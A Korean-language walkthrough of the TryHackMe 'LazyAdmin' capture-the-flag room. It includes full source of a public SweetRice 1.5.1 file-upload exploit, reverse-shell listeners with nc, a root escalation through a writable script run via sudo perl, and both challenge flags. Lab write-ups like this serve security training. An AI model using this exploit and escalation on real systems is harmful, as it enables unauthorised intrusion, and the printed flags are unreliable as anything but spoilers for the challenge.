# LazyAdmin

## Workstation
- Virtual Box : VMware Workstation 16 Pro
- OS : kali-linux-2022.3

## Walkthrough
### Task 1 | Lazy Admin

Have some fun! There might be multiple ways to get user access.

Note: It might take 2-3 minutes for the machine to boot

![machine](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/machine.png)

---

* What is the user flag?

> THM{63e5bce9271952aad1113b6f1ac28a07}

우선 nmap으로 열려있는 포트를 스캔한다.

![nmap](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/nmap.png)

22번 ssh와 80번 http 서버가 열려있다.

80번 http 서버를 접속하면 default 페이지가 나온다.

![http](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/http.png)

그럼 추가로 디렉터리를 검색한다.

![gobuster](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/gobuster.png)

`/content` 디렉터리가 나왔다.

![content](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/content.png)

SweetRice 라는 웹사이트?가 있다. 하지만 더 얻을 것이 없으므로 추가로 /content 디렉터리 안에 있는 디렉터리를 찾는다.

![gobuster_content](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/gobuster_content.png)

content 안에 많은 디렉터리들이 있다.

모든 디렉터리를 확인하다가 `/inc` 에서 `lastest.txt` 에서 버전정보를 얻었다.

![lastest](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/lastest.png)

그리고 `mysql_backup/` 디렉터리 안에 sql 파일이 있었다. 이 파일에서 sql 정보를 얻을 수 있으니 다운받는다.

![backup](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/backup.png)

이 파일에서 sql 정보를 얻을 수 있으니 다운받는다.

![curl](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/curl.png)

내용을 확인하던 중 manager 계정과 passwd 해시된 암호를 확인했다.

![sql](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/sql.png) 

해시된 암호를 풀기 위해 `hashcat`을 사용한다.

hash 파일에 해시된 암호를 입력한다.

![hashcat](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/hashcat.png)

그럼 `manager` 계정의 암호 `Password123`을 얻었으니 `/content/as` 페이지로 들어가 로그인한다.

![login](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/login.png)

이제 SweetRice 1.5.1 의 취약점을 찾아본다.

Backup Disclosure 이란 취약점이 존재하는데 아까 본 `mysql_backup/` 디렉터리에 있는 파일과 같은 것 같다.

![search](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/search.png)

그럼 리버스 쉘을 얻기 위해 파일 업로드 취약점을 확인한다.

![upload](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/upload.png)

중간에 있는 `os.system('cls')` 부분은 주석처리 해준다. 이 명령어는 터미널을 깨끗하게 지워주는 명령어 인데 없어도 괜찮은 코드이다.

```
$ cat 40716.py                                           
#/usr/bin/python
#-*- Coding: utf-8 -*-
# Exploit Title: SweetRice 1.5.1 - Unrestricted File Upload
# Exploit Author: Ashiyane Digital Security Team
# Date: 03-11-2016
# Vendor: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1
# Platform: WebApp - PHP - Mysql

import requests
import os
from requests import session

#if os.name == 'nt':
#    os.system('cls')
#else:
#    os.system('clear')
#   pass
banner = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \\ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \\     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''

print(banner)


# Get Host & User & Pass & filename
host = input("Enter The Target URL(Example : localhost.com) : ")
username = input("Enter Username : ")
password = input("Enter Password : ")
filename = input("Enter FileName (Example:.htaccess,shell.php5,index.html) : ")
file = {'upload[]': open(filename, 'rb')}

payload = {
    'user':username,
    'passwd':password,
    'rememberMe':''
}



with session() as r:
    login = r.post('http://' + host + '/as/?type=signin', data=payload)
    success = 'Login success'
    if login.status_code == 200:
        print("[+] Sending User&Pass...")
        if login.text.find(success) > 1:
            print("[+] Login Succssfully...")
        else:
            print("[-] User or Pass is incorrent...")
            print("Good Bye...")
            exit()
            pass
        pass
    uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
    if uploadfile.status_code == 200:
        print("[+] File Uploaded...")
        print("[+] URL : http://" + host + "/attachment/" + filename)
        pass                                                                                                                                                                                   
```

위에서 URL 입력 부분을 보면 host는 `/as/` 전을 URL을 입력하면 되는 것이고 파일은 php5 파일을 입력해야 한다.

그럼 리버스 쉘 파일을 복사한다. 이때 파일을 복사할 때 php5로 변경한다.

![php5](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/php5.png)

`//CHANGE THIS` 부분을 알맞게 변경한다.

![code](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/code.png)

모두 완료했으면 실행해 아래와 같이 입력하면 php5 파일이 `/attachment`에 업로드가 완료되었다고 한다.

![python](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/python.png)

그럼 `/attachment`로 이동해 리버스 쉘 파일을 시작하기 앞서 nc로 아까 설정한 5555포트로 리스닝해 놓는다.

```
sudo nc -lvnp 5555
```

그 후 `/attachment` 로 이동해 php5 파일을 눌러주면 다음과 같이 쉘을 얻을 수 있다.

![reverse](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/reverse.png)

![nc](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/nc.png)

user.txt를 찾아 플래그를 입력한다.

![user](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/user.png)

* What is the root flag?

> THM{6637f41d0177b6f37cb20d775124699f}

root 권한 획득을 위해 sudo 명령으로 실행 가능한 명령어를 확인한다.

![sudo](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/sudo.png)

perl 명령어로 backup.pl 파일을 패스워드 없이 root 권한으로 실행가능하다고 한다. 

그럼 `/home/itguy/backup.pl` 파일을 확인한다.

이 파일 안에서 다시 sh 명령어로 실행하는 /etc/copy.sh 파일이 있다.

이 파일을 확인해 보면 nc 명령어를 실행하는 코드가 있다. 이 코드를 `echo` 명령어로 내 아이피 주소와 포트로 변경해 준 후 다시 copy.sh 파일에 저장한다.

![pl](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/pl.png)

nc 명령어 실행을 위해 새로운 터미널을 열어 아까 설정한 6666번 포트로 리스닝한다.

```
sudo nc -lvnp 6666
```

리스닝시키고 다시 `sudo /usr/bin/perl /home/itguy/backup` 명령어를 사용하면 리버스 쉘을 얻을 수 있다.

root 권한을 획득했으니 플래그도 얻었다.

![root](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/LazyAdmin/image/root.png)
